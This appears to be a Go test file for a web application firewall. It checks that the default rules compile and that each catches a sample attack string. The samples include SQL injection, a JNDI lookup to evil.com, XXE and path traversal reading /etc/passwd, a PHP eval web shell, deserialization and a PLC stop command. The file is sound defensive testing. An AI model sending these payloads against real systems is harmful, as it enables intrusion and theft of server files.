package waf

import (
	"regexp"
	"testing"
)

func TestAllDefaultRulesCompile(t *testing.T) {
	rs := DefaultRules()
	if len(rs) < 75 {
		t.Fatalf("expected >=75 rules, got %d", len(rs))
	}
	for _, r := range rs {
		if _, err := regexp.Compile(r.Pattern); err != nil {
			t.Errorf("rule %s compile failed: %v", r.ID, err)
		}
	}
}

func TestKeyAttacksCaught(t *testing.T) {
	rs := DefaultRules()
	cases := map[string]string{
		"sqli_1":  "id=1 union select 1,2,3",
		"rce_1":   "cmd=system('id')",
		"java_2":  "x=${jndi:ldap://evil.com/a}",
		"xxe_1":   "a=<!DOCTYPE x SYSTEM \"file:///etc/passwd\">",
		"file_2":  "f=../../../etc/passwd",
		"ws_1":    "c=eval($_POST[x])",
		"ics_2":   "cmd=plc_stop unit=1",
		"jwt_1":   "alg=none",
		"deser_1": "p=O:8:\"evil\":0:{}",
		// 新增：各系统中间件版本漏洞
		"iis_1":     "/a.asp?x=??~1",
		"iis_3":     "PUT /upload.asp HTTP/1.1",
		"tomcat_1":  "x=WEB-INF/web.xml",
		"tomcat_2":  "GET /manager/html HTTP/1.1",
		"apache_1":  "cgi-bin/..%252e%252e/etc/passwd",
		"nginx_2":   "x=X-Accel-Redirect",
		"win_1":     "x=CVE-2019-0708",
		"win_2":     "x=MS17-010",
	}
	for id, payload := range cases {
		found := false
		for _, r := range rs {
			if r.ID != id {
				continue
			}
			re, err := regexp.Compile(r.Pattern)
			if err != nil {
				t.Fatalf("compile %s: %v", id, err)
			}
			if re.MatchString(payload) {
				found = true
				break
			}
		}
		if !found {
			t.Errorf("payload for %s NOT caught: %s", id, payload)
		}
	}
}
